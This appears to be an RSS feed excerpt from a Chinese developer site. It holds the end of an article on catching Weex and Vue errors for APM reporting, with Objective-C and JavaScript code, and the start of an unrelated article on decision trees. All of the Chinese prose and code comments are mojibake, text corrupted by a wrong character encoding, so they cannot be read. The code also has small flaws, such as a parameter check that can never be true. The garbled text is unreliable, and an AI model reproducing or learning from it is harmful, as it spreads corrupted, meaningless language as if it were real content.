JS çš„äº‹ä»¶å¤„ç†å‡½æ•°é‡Œï¼Œè°ƒç”¨æ³¨å†Œçš„ Module å’Œå¯¹åº”çš„æ–¹æ³•ï¼Œä¼šç»Ÿä¸€èµ°åˆ° <code>WXJSCoreBridge.mm</code> çš„ <code>- (void)registerCallNativeModule:(WXJSCallNativeModule)callNativeModuleBlock</code> ç»™å½“å‰çš„ JSContext æ³¨å†Œå¥½çš„ <code>callNativeModule</code> å›è°ƒé‡Œã€‚<code>_jsContext[@"callNativeModule"] = ^JSValue *(JSValue *instanceId, JSValue *moduleName, JSValue *methodName, JSValue *args, JSValue *options)</code> å¯ä»¥æ‹¿åˆ°æ¨¡å—åã€æ–¹æ³•åã€å‚æ•°ä¸ªæ•°ã€instanceID ç­‰ã€‚æ‹¿åˆ°å®é™…ä¼ é€’çš„æ–¹æ³•å‚æ•°åˆ—è¡¨ï¼Œå†é€šè¿‡æ¨¡å—åæ ¹æ® <code>ModuleFactory</code> æ‰¾åˆ°æ¨¡å—ç±»å¯¹è±¡ï¼Œç„¶ååˆ©ç”¨ runtime èƒ½åŠ›ï¼Œéå†ç±»å¯¹è±¡çš„æ–¹æ³•åˆ—è¡¨ï¼Œæ‰¾åˆ°å¯¹åº”çš„ SELï¼Œåˆ¤æ–­å…¶é¢„æœŸçš„æ–¹æ³•å‚æ•°ä¸ªæ•°ï¼Œç„¶åå†å’Œå®é™…ä¼ é€’è¿‡æ¥çš„æ–¹æ³•å‚æ•°ä¸ªæ•°åšæ¯”è¾ƒå³å¯</p>
<pre><code class="hljs language-Objective-c" lang="Objective-c">- (void)registerCallNativeModule:(WXJSCallNativeModule)callNativeModuleBlock
{
    // JS è°ƒç”¨ Native çš„æ–¹æ³•éƒ½ä¼šèµ°è¿™é‡Œã€‚å¯ä»¥è§£æåˆ°ï¼šæ¨¡å—åã€æ–¹æ³•åã€å‚æ•°æ•°ç»„ç­‰ä¿¡æ¯ã€‚å¯ä»¥åœ¨è¿™é‡Œåˆ¤æ–­æ–¹æ³•å‚æ•°ä¸ªæ•°æ˜¯å¦ç›¸åŒã€‚
    _jsContext[@"callNativeModule"] = ^JSValue *(JSValue *instanceId, JSValue *moduleName, JSValue *methodName, JSValue *args, JSValue *options) {
        // ...
    };
}
</code></pre>
<p>åœ¨å…¶ <code>callNativeModule</code> çš„ block é‡Œï¼Œå¢åŠ ä¸€ä¸ªæ–¹æ³•ï¼Œä¸“é—¨ç”¨æ¥åˆ¤æ–­å’Œæ£€æŸ¥æ–¹æ³•å‚æ•°ä¸ªæ•°æ˜¯å¦åŒ¹é…çš„é—®é¢˜</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">// è¾…åŠ©æ–¹æ³•ï¼šæ ¡éªŒModuleæ–¹æ³•å‚æ•°ä¸ªæ•°
- (void)checkModuleParamCount:(NSString *)moduleName
                   methodName:(NSString *)methodName
                 actualParams:(NSArray *)actualParams
                   instanceId:(NSString *)instanceId {
    // 1. è·³è¿‡ç©ºå€¼/ç³»ç»Ÿæ¨¡å—ï¼ˆé¿å…æ— æ„ä¹‰æ ¡éªŒï¼‰
    if (!moduleName || !methodName || actualParams.count &lt; 0) return;
    Class moduleClass = [WXModuleFactory classWithModuleName:moduleName];
    if (!moduleClass) return;

    // 2. æ‹¼æ¥å®Œæ•´çš„æ–¹æ³•é€‰æ‹©å™¨ï¼ˆWeex Moduleæ–¹æ³•åå¸¦å†’å·ï¼Œéœ€è¡¥å…¨ï¼Œå¦‚multiplyâ†’multiply:num2:callback:ï¼‰
    // æ³¨ï¼šè‹¥æ–¹æ³•åè§„åˆ™å›ºå®šï¼Œå¯é€šè¿‡æ¨¡å—ç±»çš„æ–¹æ³•åˆ—è¡¨è·å–æ‰€æœ‰selectorï¼ŒåŒ¹é…å‰ç¼€
    SEL targetSel = nil;
    unsigned int methodCount = 0;
    Method *methods = class_copyMethodList(moduleClass, &amp;methodCount);
    for (int i = 0; i &lt; methodCount; i++) {
        Method method = methods[i];
        SEL sel = method_getName(method);
        NSString *selStr = NSStringFromSelector(sel);
        // åŒ¹é…å‰ç¼€ï¼ˆå¦‚multiplyå¼€å¤´çš„æ–¹æ³•ï¼‰
        if ([selStr hasPrefix:methodName]) {
            targetSel = sel;
            break;
        }
    }
    free(methods);
    if (!targetSel) return;

    // 3. è§£ææ–¹æ³•ç­¾åï¼Œè®¡ç®—é¢„æœŸå‚æ•°ä¸ªæ•°ï¼ˆå‡self/_cmdï¼‰
    NSMethodSignature *methodSig = [moduleClass instanceMethodSignatureForSelector:targetSel];
    NSInteger weexParamCount = methodSig.numberOfArguments - 2;

    // 4. åˆ¤æ–­å‚æ•°ä¸ªæ•°æ˜¯å¦ä¸åŒ¹é…
    if (actualParams.count != weexParamCount) {
        // æ„é€ é”™è¯¯ä¿¡æ¯
        NSString *errorMsg = [NSString stringWithFormat:@"Module:%@ æ–¹æ³•:%@ å‚æ•°ä¸ªæ•°ä¸åŒ¹é…ï¼Œé¢„æœŸ%ldä¸ªï¼Œå®é™…%ldä¸ª",
                              moduleName, methodName, weexParamCount, actualParams.count];
        WXLogError(@"[WeexParamError] %@", errorMsg);

        // 5. ä¸ŠæŠ¥APMï¼ˆæ ¸å¿ƒï¼šç”Ÿäº§ç¯å¢ƒç›‘æ§ï¼‰
        NSDictionary *apmData = @{
            @"error_type": @"weex_module_param_count_mismatch",
            @"module_name": moduleName,
            @"method_name": methodName,
            @"expected_count": @(weexParamCount),
            @"actual_count": @(actualParams.count),
            @"actual_params": actualParams,
            @"instance_id": instanceId ?: @"",
            @"timestamp": @([[NSDate date] timeIntervalSince1970] * 1000),
            @"message": errorMsg
        };

        // APM:å¼‚æ­¥ä¸ŠæŠ¥ï¼Œé¿å…é˜»å¡JSæ¡¥æ¥
        NSLog(@"APM æ•°æ®ä¸ŠæŠ¥é€šé“ï¼Œã€JS é€šè¿‡ Module è°ƒç”¨ Native æ–¹æ³•ï¼Œå‚æ•°ä¸ªæ•°ä¸åŒ¹é…ã€‘ï¼š%@", apmData);
    }
}
</code></pre>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bd25d1035904328bb1420da7f7961c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=Vt4Dsl4Nmtzch2kyJ9N%2FnA6qwsk%3D" alt="WeexCallNativeModuleParamsError.png" loading="lazy"/></p>
<h4 data-id="heading-79">5. Vue å±‚é¢å¼‚å¸¸</h4>
<p>Weex åº•å±‚ä¾é  Vue å®ç°ï¼Œå·®å¼‚åŒ–å°±æ˜¯ VM å»é€šè¿‡ Bridge åœ¨ WeexSDK Native å»åšç»˜åˆ¶ã€‚å¼‚å¸¸æ–¹é¢é™¤äº†å¸¸è§„çš„ JS è¿è¡Œæ—¶å¼‚å¸¸ï¼ˆå¦‚è¯­æ³•é”™è¯¯ã€ç±»å‹é”™è¯¯ç­‰ 7 ç§ï¼‰ï¼ŒVue æ¡†æ¶è‡ªèº«çš„é€»è¾‘å±‚ã€ç¼–è¯‘å±‚ã€å“åº”å¼ç³»ç»Ÿã€ç»„ä»¶ç”Ÿå‘½å‘¨æœŸ ç­‰ç¯èŠ‚ä¼šæŠ›å‡ºä¸“å±å¼‚å¸¸ï¼Œè¿™äº›å¼‚å¸¸å¿…é¡»é€šè¿‡ Vue.config.errorHandler å…œåº•ã€‚</p>
<p>åˆ†æ Weex æºç ä¸­ï¼š<code>packages/weex-js-framework/index.js/</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleError</span> (err, vm, info) {
  <span class="hljs-keyword">if</span> (vm) {
    <span class="hljs-keyword">var</span> cur = vm;
    <span class="hljs-keyword">while</span> ((cur = cur.<span class="hljs-property">$parent</span>)) {
      <span class="hljs-keyword">var</span> hooks = cur.<span class="hljs-property">$options</span>.<span class="hljs-property">errorCaptured</span>;
      <span class="hljs-keyword">if</span> (hooks) {
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; hooks.<span class="hljs-property">length</span>; i++) {
          <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">var</span> capture = hooks[i].<span class="hljs-title function_">call</span>(cur, err, vm, info) === <span class="hljs-literal">false</span>;
            <span class="hljs-keyword">if</span> (capture) { <span class="hljs-keyword">return</span> }
          } <span class="hljs-keyword">catch</span> (e) {
            <span class="hljs-title function_">globalHandleError</span>(e, cur, <span class="hljs-string">'errorCaptured hook'</span>);
          }
        }
      }
    }
  }
  <span class="hljs-title function_">globalHandleError</span>(err, vm, info);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">globalHandleError</span> (err, vm, info) {
  <span class="hljs-keyword">if</span> (config.<span class="hljs-property">errorHandler</span>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">return</span> config.<span class="hljs-property">errorHandler</span>.<span class="hljs-title function_">call</span>(<span class="hljs-literal">null</span>, err, vm, info)
    } <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-title function_">logError</span>(e, <span class="hljs-literal">null</span>, <span class="hljs-string">'config.errorHandler'</span>);
    }
  }
  <span class="hljs-title function_">logError</span>(err, vm, info);
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f59bc9512ac44aa7868c7bec1817a4f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=5SezT87Wi5Mt311I3SEDLwsrRaA%3D" alt="WeexCaptureVueError.png" loading="lazy"/></p>
<p>æºç ä¸­ nextTickã€Vue.prototype.$emitã€callHookã€Watcher.prototype.getã€Watcher.prototype.runã€renderRecyclableComponentTemplateã€Vue.prototype._render ç­‰ç­‰éƒ½è°ƒç”¨äº†  handleError æ–¹æ³•ã€‚
Vue å†…éƒ¨å¯¹éƒ¨åˆ†å¼‚å¸¸åšäº†å°è£…/æ‹¦æˆªï¼Œé¿å…ç›´æ¥å†’æ³¡åˆ°å…¨å±€ï¼ˆé˜²æ­¢é˜»æ–­åº”ç”¨æ•´ä½“è¿è¡Œï¼‰ï¼Œä½†ä¼šé€šè¿‡ errorHandler æš´éœ²å‡ºæ¥ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼ŒWeexAPM ç±»å¯ä»¥å°è£…ä¸ºï¼š</p>
<pre><code class="hljs language-JS" lang="JS"><span class="hljs-comment">/**
 * APM
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">WeexAPM</span> {
  <span class="hljs-comment">/**
   * è·å–å½“å‰çš„å¶å­èŠ‚ç‚¹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">*</span>} Vue vm
   * <span class="hljs-doctag">@returns</span> å½“å‰ç»„ä»¶åç§°
   */</span>
  formatComponentName (vm) {
    <span class="hljs-keyword">if</span> (vm.<span class="hljs-property">$root</span> === vm) <span class="hljs-keyword">return</span> <span class="hljs-string">'root'</span>
    <span class="hljs-keyword">var</span> name = vm.<span class="hljs-property">_isVue</span>
      ? (vm.<span class="hljs-property">$options</span> &amp;&amp; vm.<span class="hljs-property">$options</span>.<span class="hljs-property">name</span>) ||
        (vm.<span class="hljs-property">$options</span> &amp;&amp; vm.<span class="hljs-property">$options</span>.<span class="hljs-property">_componentTag</span>)
      : vm.<span class="hljs-property">name</span>
    <span class="hljs-keyword">return</span> (
      (name ? <span class="hljs-string">'component &lt;'</span> + name + <span class="hljs-string">'&gt;'</span> : <span class="hljs-string">'anonymous component'</span>) +
      (vm.<span class="hljs-property">_isVue</span> &amp;&amp; vm.<span class="hljs-property">$options</span> &amp;&amp; vm.<span class="hljs-property">$options</span>.<span class="hljs-property">__file</span>
        ? <span class="hljs-string">' at '</span> + (vm.<span class="hljs-property">$options</span> &amp;&amp; vm.<span class="hljs-property">$options</span>.<span class="hljs-property">__file</span>)
        : <span class="hljs-string">''</span>)
    )
  }

  <span class="hljs-comment">/**
   * å¤„ç†Vueé”™è¯¯æç¤º
   */</span>
  monitor (<span class="hljs-title class_">Vue</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Vue</span>) {
      <span class="hljs-keyword">return</span>
    }
    <span class="hljs-comment">// é”™è¯¯å¤„ç†</span>
    <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">errorHandler</span> = <span class="hljs-function">(<span class="hljs-params">err, vm, info</span>) =&gt;</span> {
      <span class="hljs-keyword">let</span> componentName = <span class="hljs-string">'unknown'</span>
      <span class="hljs-keyword">if</span> (vm) {
        componentName = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">formatComponentName</span>(vm)
      }
      <span class="hljs-keyword">let</span> errorInfo = {
        <span class="hljs-attr">name</span>: err.<span class="hljs-property">name</span>,
        <span class="hljs-attr">reason</span>: err.<span class="hljs-property">message</span>,
        <span class="hljs-attr">callStack</span>: err.<span class="hljs-property">stack</span>,
        <span class="hljs-attr">componentName</span>: componentName,
        <span class="hljs-attr">info</span>: info,
        <span class="hljs-attr">level</span>: <span class="hljs-string">'VUE_ERROR'</span>
      }
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> weexAPMUploader = weex.requireModule(<span class="hljs-string">'weexAPMUploader'</span>)
        weexAPMUploader.<span class="hljs-title function_">uploadException</span>(errorInfo)
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'APMMonitor èƒ½åŠ›æœ‰é—®é¢˜ï¼Œè¯·æ£€æŸ¥æ˜¯å¦æ³¨å†Œäº†weexAPMUploaderæ¨¡å—'</span> + error)
      }
    }
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">WeexAPM</span>
</code></pre>
<p>åœ¨æ•è·åˆ° Vue å±‚é¢çš„å¼‚å¸¸æ—¶ï¼Œå¯ä»¥è°ƒç”¨æ³¨å†Œå¥½çš„ weexAPMUploader module èƒ½åŠ›ï¼Œå°†æ•°æ®ä¼ è¾“åˆ° Native ä¾§ï¼Œç”± Native ä¾§è¿›è¡Œç»Ÿä¸€çš„å‚æ•°ç»„è£…ï¼Œæœ€åè°ƒç”¨ APM SDK çš„èƒ½åŠ›è¿›è¡Œæ•°æ®å†™å…¥æ•°æ®åº“ã€æŒ‰ç…§ç­–ç•¥ä¸ŠæŠ¥åˆ° APM æœåŠ¡ç«¯è¿›è¡Œæ¶ˆè´¹ã€‚</p>
<p>æ¨¡æ‹Ÿäº§ç”Ÿ Vue å±‚çº§çš„é”™è¯¯ï¼šç»™ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®ï¼Œåœ¨è®¡ç®—å±æ€§é‡Œè°ƒç”¨ <code>toFixed</code> æ–¹æ³•ã€‚æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶é‡Œå°†æ•°æ®æ”¹ä¸ºå­—ç¬¦ä¸²ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚
å¯ä»¥çœ‹åˆ°è¢« <code>Vue.config.errorHandler</code> æ•è·äº†ï¼Œåç»­äº¤ç»™ Native å¤„ç†å³å¯ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c302b4a08944df885a48f5cb732c7ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2t5Z-O5bCP5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767925474&amp;x-signature=VtY%2Flp2%2F9jlnThAaAsyQlyi8zgM%3D" alt="WeexMockVueAPM.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¤§æ•°æ®-201 å†³ç­–æ ‘ä»åˆ†è£‚åˆ°å‰ªæï¼šä¿¡æ¯å¢ç›Š/å¢ç›Šç‡ã€è¿ç»­å˜é‡ä¸CARTè¦ç‚¹]]></title>    <link>https://juejin.cn/post/7589940210832474155</link>    <guid>https://juejin.cn/post/7589940210832474155</guid>    <pubDate>2026-01-03T01:29:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589940210832474155" data-draft-id="7590654280899674155" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¤§æ•°æ®-201 å†³ç­–æ ‘ä»åˆ†è£‚åˆ°å‰ªæï¼šä¿¡æ¯å¢ç›Š/å¢ç›Šç‡ã€è¿ç»­å˜é‡ä¸CARTè¦ç‚¹"/> <meta itemprop="keywords" content="åç«¯,å¤§æ•°æ®,æœºå™¨å­¦ä¹ "/> <meta itemprop="datePublished" content="2026-01-03T01:29:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ­¦å­åº·"/> <meta itemprop="url" content="https://juejin.cn/user/149189314230039"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¤§æ•°æ®-201 å†³ç­–æ ‘ä»åˆ†è£‚åˆ°å‰ªæï¼šä¿¡æ¯å¢ç›Š/å¢ç›Šç‡ã€è¿ç»­å˜é‡ä¸CARTè¦ç‚¹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/149189314230039/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ­¦å­åº·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-03T01:29:43.000Z" title="Sat Jan 03 2026 01:29:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TL;DR</h2>
<ul>
<li>åœºæ™¯ï¼šç”¨å†³ç­–æ ‘åšåˆ†ç±»/å›å½’ï¼Œéœ€è¦è§£é‡Šâ€œè´ªå¿ƒå±€éƒ¨æœ€ä¼˜ã€åˆ†è£‚å‡†åˆ™ã€å‰ªæã€è¿ç»­å˜é‡å¤„ç†â€ã€‚</li>
<li>ç»“è®ºï¼šæ ¸å¿ƒçŸ›ç›¾æ˜¯â€œè®­ç»ƒé›†çº¯åº¦æå‡â€ä¸â€œæ³›åŒ–èƒ½åŠ›â€å†²çªï¼›ç”¨å¢ç›Šç‡/åŸºå°¼å‡†åˆ™ +ï¼ˆé¢„/åï¼‰å‰ªæ + éªŒè¯ç­–ç•¥æ¥å¹³è¡¡ã€‚</li>
<li>äº§å‡ºï¼šä¸€å¥—å¯å¤ç”¨çš„æ¦‚å¿µæ¡†æ¶ï¼šåˆ†è£‚æ ‡å‡†â†’äºŒå‰åˆ†è£‚â†’è¿ç»­å˜é‡å€™é€‰åˆ‡åˆ†ç‚¹â†’å‰ªæä¸éªŒè¯é›†ä¿®æ­£ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3f819ee50ca40f7acd0b97136f1ef65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768008582&amp;x-signature=%2F27FUN5TSkjF7bb4ea1Qr0cCoSA%3D" alt="å¤§æ•°æ®-201 å†³ç­–æ ‘ä»åˆ†è£‚åˆ°å‰ªæï¼šä¿¡æ¯å¢ç›Š/å¢ç›Šç‡ã€è¿ç»­å˜é‡ä¸CARTè¦ç‚¹" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c92c6d2df6d4f619d8384e5c214dd0a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768008582&amp;x-signature=EKYpFqdwW%2BxyiyJ9Br68jmFvSrM%3D" alt="å¤§æ•°æ®-201 å†³ç­–æ ‘ä»åˆ†è£‚åˆ°å‰ªæï¼šä¿¡æ¯å¢ç›Š/å¢ç›Šç‡ã€è¿ç»­å˜é‡ä¸CARTè¦ç‚¹" loading="lazy"/></p>
<h2 data-id="heading-1">å†³ç­–æ ‘</h2>
<p>å†³ç­–æ ‘æ˜¯ä¸€ç§åŸºäºæ ‘çŠ¶ç»“æ„çš„ç›‘ç£å­¦ä¹ æ¨¡å‹ï¼Œå¸¸ç”¨äºåˆ†ç±»å’Œå›å½’ä»»åŠ¡ã€‚å®ƒçš„åŸºæœ¬æ€æƒ³æ˜¯é€šè¿‡ä¸€ç³»åˆ—é—®é¢˜çš„åˆ†å±‚æ¬¡åˆ¤æ–­ï¼Œå°†æ•°æ®åˆ†å‰²æˆè¶Šæ¥è¶Šå°çš„å­é›†ï¼Œç›´åˆ°è¾¾åˆ°é¢„æœŸçš„ç›®æ ‡ï¼ˆå¦‚çº¯åº¦è¾ƒé«˜çš„å¶å­èŠ‚ç‚¹ï¼Œæˆ–é¢„æµ‹å€¼çš„è¯¯å·®è¶³å¤Ÿå°ï¼‰ã€‚å†³ç­–æ ‘çš„èŠ‚ç‚¹è¡¨ç¤ºåˆ¤æ–­æ¡ä»¶ï¼Œåˆ†æ”¯è¡¨ç¤ºä¸åŒçš„æ¡ä»¶ç»“æœï¼Œæœ€ç»ˆçš„å¶å­èŠ‚ç‚¹å¯¹åº”å…·ä½“çš„åˆ†ç±»ç»“æœæˆ–é¢„æµ‹å€¼ã€‚</p>
<h2 data-id="heading-2">å±€éƒ¨æœ€ä¼˜</h2>
<p>åœ¨æ„å»ºå†³ç­–æ ‘çš„æœºå™¨å­¦ä¹ è¿‡ç¨‹ä¸­ï¼Œé€šå¸¸é‡‡ç”¨è´ªå¿ƒç®—æ³•ï¼ˆGreedy Algorithmï¼‰ä½œä¸ºæ ¸å¿ƒçš„åˆ†å‰²ç­–ç•¥ã€‚è¿™ç§æ–¹æ³•çš„åŸºæœ¬åŸç†æ˜¯ï¼šåœ¨æ¯ä¸€æ­¥å†³ç­–æ—¶ï¼Œéƒ½é€‰æ‹©å½“å‰æ¡ä»¶ä¸‹æœ€ä¼˜çš„åˆ†å‰²æ–¹å¼ï¼Œè€Œä¸è€ƒè™‘è¿™ä¸€é€‰æ‹©å¯¹åç»­æ­¥éª¤å¯èƒ½äº§ç”Ÿçš„å½±å“ã€‚</p>
<p>å…·ä½“æ¥è¯´ï¼Œå†³ç­–æ ‘çš„æ„å»ºè¿‡ç¨‹ä¼šé€’å½’åœ°è¿›è¡Œä»¥ä¸‹æ“ä½œï¼š</p>
<ol>
<li>åœ¨å½“å‰èŠ‚ç‚¹ä¸Šï¼Œè®¡ç®—æ‰€æœ‰å¯èƒ½çš„ç‰¹å¾å’Œåˆ†å‰²ç‚¹çš„ä¿¡æ¯å¢ç›Šï¼ˆæˆ–åŸºå°¼ä¸çº¯åº¦ç­‰åˆ†è£‚æ ‡å‡†ï¼‰</li>
<li>é€‰æ‹©ä½¿ä¿¡æ¯å¢ç›Šæœ€å¤§åŒ–çš„ç‰¹å¾å’Œåˆ†å‰²ç‚¹</li>
<li>æ ¹æ®é€‰å®šçš„åˆ†å‰²å°†æ•°æ®é›†åˆ’åˆ†ä¸ºè‹¥å¹²å­é›†</li>
